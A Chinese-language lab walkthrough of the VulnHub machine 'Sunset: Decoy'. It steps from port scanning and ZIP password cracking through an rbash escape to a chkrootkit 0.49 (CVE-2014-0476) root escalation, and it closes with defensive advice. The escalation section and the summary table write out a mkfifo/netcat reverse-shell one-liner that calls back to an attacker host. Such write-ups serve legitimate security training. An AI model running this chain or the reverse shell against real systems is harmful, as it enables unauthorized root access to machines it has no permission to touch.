---
title: 'VulnHub Sunset: Decoy 靶机完整渗透测试实战'
description: 从信息收集、ZIP 密码破解、SSH 受限 Shell 绕过、chkrootkit 0.49 本地提权到最终获取 Root 权限的全链路复现
category: ai-security
tags:
- VulnHub
- CTF
- 渗透测试
- 提权
- SSH绕过
- chkrootkit
- ZIP破解
- 实战复现
date: 2023-04-16
updated: '2026-11-14'
---
## 概述

本页面记录 VulnHub 靶机 **Sunset: Decoy** 的完整渗透测试实战过程。该靶机涵盖信息收集、Web 目录枚举、加密 ZIP 文件密码破解、SSH 受限 Shell 绕过、进程监控发现定时任务、chkrootkit 0.49 本地提权漏洞利用等核心技术点，是一道典型的从低权限用户提升至 Root 权限的实战演练。

> 靶机地址：https://www.vulnhub.com/entry/sunset-decoy,505  
> 来源：0x00实验室微信公众号归档 [[0x00lab-wechat-archive-202108-202304]]

---

## 0x00 主机发现与端口扫描

### 存活探测
使用 `netdiscover` 或 `nmap -sn` 进行主机发现，确定目标 IP 为 `192.168.33.131`。

### 端口服务枚举
```bash
nmap -sV -sC -p- 192.168.33.131
```
扫描结果显示开放端口：
- **22/tcp**  SSH (OpenSSH 7.9p1)
- **80/tcp**  HTTP (Apache httpd 2.4.38)

---

## 0x01 Web 信息收集与目录枚举

### 网站首页分析
访问 `http://192.168.33.131` 发现一个简单的页面，提示下载 `save.zip` 文件。

### 目录扫描
使用 `dirb` 或 `gobuster` 进行目录枚举：
```bash
gobuster dir -u http://192.168.33.131 -w /usr/share/wordlists/dirb/common.txt
```
发现关键目录/文件：
- `/save.zip` — 加密压缩包，包含凭据信息

---

## 0x02 ZIP 密码破解与凭据获取

### 压缩包哈希提取
```bash
zip2john save.zip > passwd.txt
```

### John the Ripper 离线破解
```bash
john passwd.txt
```
成功破解密码为：**`server`**

### 解压获取凭据
解压 `save.zip` 得到文件内容：
```
账号：296640a3b825115a47b68fc44501c828
密码：server
```

> 技术点延伸：ZIP 爆破工具链参考 [[0w1club-ctf-misc-writeup-steganography-traffic-analysis]] 中的 ZIP 文件头修复与取证分析章节。

---

## 0x03 SSH 登录与受限 Shell 绕过

### 初始登录尝试
```bash
ssh 296640a3b825115a47b68fc44501c828@192.168.33.131
# 密码: server
```
登录后发现处于 **受限 Shell (rbash)** 环境，大量命令被禁用（如 `ls`、`cat`、`cd` 等）。

### 绕过技巧：强制分配伪终端 + 指定 Shell
```bash
ssh 296640a3b825115a47b68fc44501c828@192.168.33.131 -t "bash --noprofile"
```
- `-t`：强制分配伪终端
- `bash --noprofile`：不加载 `.bash_profile` / `.bashrc` 等配置文件，绕过受限环境初始化

登录后手动修正 `PATH` 变量：
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

> 相关技巧参考：[[0w1club-training-shellshock-cgi-exploitation]] 中的 Shell 交互与环境变量控制；[[metasploit-framework-basics-tutorial]] 中的会话建立与后渗透基础操作。

---

## 0x04 权限维持与进程监控

### pspy 监控定时任务
上传 `pspy64` 静态二进制至 `/tmp` 并运行：
```bash
./pspy64 -pf -i 1000
```
捕获到疑似定时任务执行记录：
```
CMD: unzip -o /home/296640a3b825115a47b68fc44501c828/honeypot.zip -d /home/296640a3b825115a47b68fc44501c828/
```

### 家目录文件分析
发现可执行文件 `honeypot.decoy`，运行后呈现菜单：
```
1. Option 1
...
5. AV SCAN
...
8. Exit
```
选项 5 **AV SCAN** 疑似调用 `chkrootkit` 进行扫描。

---

## 0x05 chkrootkit 0.49 本地提权漏洞利用

### 漏洞原理
**chkrootkit 0.49 及以下版本** 存在本地提权漏洞（CVE-2014-0476）。当 `chkrootkit` 以 root 权限运行时，会在 `/tmp` 目录下查找名为 `update` 的可执行文件并执行。

### 漏洞验证
```bash
chkrootkit -V
# 输出: chkrootkit version 0.49
```

### 构造恶意 update 文件
```bash
cd /tmp
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.33.150 4444 > /tmp/f" > update
chmod +x update
```
- 使用 `mkfifo` 创建命名管道实现反弹 Shell
- 攻击机 IP: `192.168.33.150`，监听端口: `4444`

### 攻击机监听
```bash
nc -lvnp 4444
```

### 触发漏洞
在受限用户下运行 `honeypot.decoy` 并选择 **选项 5 (AV SCAN)**，程序以 root 权限调用 `chkrootkit`，进而执行 `/tmp/update`，反弹 Root Shell。

### 获取 Root 权限
连接建立后验证：
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

> 漏洞利用细节参考：[[cve-digest-20210423]] 中 Linux overlayfs 提权 (CVE-2021-3493) 等本地提权案例；[[frp内网渗透应用]] 中的隧道技术可用于实际场景下的反连隐匿。

---

## 0x06 关键技术点总结

| 阶段 | 核心工具/技术 | 关键命令/操作 |
|------|---------------|---------------|
| 信息收集 | nmap, netdiscover | `nmap -sV -sC -p- <IP>` |
| Web枚举 | gobuster, dirb | `gobuster dir -u <URL> -w <wordlist>` |
| 密码破解 | zip2john, John the Ripper | `zip2john file.zip > hash.txt && john hash.txt` |
| SSH绕过 | ssh -t, bash --noprofile | `ssh user@ip -t "bash --noprofile"` |
| 进程监控 | pspy | `./pspy64 -pf -i 1000` |
| 本地提权 | chkrootkit 0.49 CVE-2014-0476 | `/tmp/update` 可执行文件 + 定时任务触发 |
| 反弹Shell | netcat, mkfifo | `mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> > /tmp/f` |

---

## 0x07 防御与缓解建议

1. **最小权限原则**：避免以 root 权限运行定时扫描工具；使用专用低权限账户执行 `chkrootkit`。
2. **版本更新**：升级 `chkrootkit` 至 0.50 及以上版本，已修复该漏洞。
3. **目录权限控制**：限制 `/tmp` 目录的写入权限，或使用 `noexec`、`nosuid` 挂载选项。
4. **受限 Shell 加固**：
   - 设置 `PATH` 为只读变量
   - 禁用 `-t` 强制伪终端分配（`PermitTTY no` 在 `sshd_config` 中）
   - 使用 `rbash` 并配合 `restricted` 环境变量
5. **审计与监控**：部署审计守护进程（`auditd`）监控关键目录文件创建/执行事件。

---

## 关联页面

- [[0x00lab-wechat-archive-202108-202304]] — 文章来源归档索引
- [[metasploit-framework-basics-tutorial]] — 后渗透框架基础操作
- [[frp内网渗透应用]] — 内网穿透与隧道技术实战
- [[0w1club-training-shellshock-cgi-exploitation]] — Shell 环境绕过与漏洞利用基础
- [[burpsuite-basics-tutorial]] — Web 代理抓包与目录枚举工具用法
- [[cve-digest-20210423]] — Linux 本地提权漏洞汇总（含 overlayfs CVE-2021-3493）
- [[0w1club-ctf-misc-writeup-steganography-traffic-analysis]] — ZIP 文件取证与密码破解技巧

## 来源

- [0x00实验室-202108-202304_015](../sources/0x00实验室-202108-202304_015.md)
